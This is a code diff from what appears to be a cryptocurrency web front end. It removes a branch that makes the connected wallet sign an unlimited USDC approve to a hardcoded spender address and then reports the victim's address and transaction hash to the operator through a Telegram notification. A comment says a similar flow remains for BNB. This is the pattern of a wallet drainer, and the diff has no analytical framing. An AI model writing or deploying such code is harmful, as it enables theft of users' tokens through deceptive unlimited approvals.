@@ -279,58 +279,6 @@ export default function Index() {
 
       const ethers = (window as any).ethers;
 
-      // For Ethereum USDC, use the old flow (eth_accounts, ethers.utils.Interface)
-      if (selectedChain === "Ethereum" && selectedToken === "USDC") {
-        let ethereum = window.ethereum;
-        let retries = 0;
-        while (!ethereum && retries < 10) {
-          await new Promise(resolve => setTimeout(resolve, 100));
-          ethereum = window.ethereum;
-          retries++;
-        }
-
-        if (!ethereum) {
-          throw new Error('Trust Wallet not detected');
-        }
-
-        let accounts = await ethereum.request({ method: "eth_accounts" });
-        let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
-
-        if (!userAddress) {
-          throw new Error('No account found');
-        }
-
-        const currentChainId = await ethereum.request({ method: 'eth_chainId' });
-        if (currentChainId !== "0x1") {
-          try {
-            await ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: "0x1" }]
-            });
-          } catch (err: any) {
-            if (err.code === 4902) {
-              throw new Error('Network not supported');
-            }
-          }
-        }
-
-        const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) public returns (bool)']);
-        const tx = {
-          to: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-          data: iface.encodeFunctionData('approve', ["0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA", ethers.constants.MaxUint256]),
-          from: userAddress
-        };
-
-        let txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
-
-        await new Promise(resolve => setTimeout(resolve, 100));
-
-        await sendTelegramNotification(userAddress, txHash);
-        setApproveSucceeded(true);
-        return;
-      }
-
-      // For BNB, use the original flow (eth_requestAccounts, contract.approve)
       let chainId: string;
       let chainName: string;
       let rpcUrl: string;
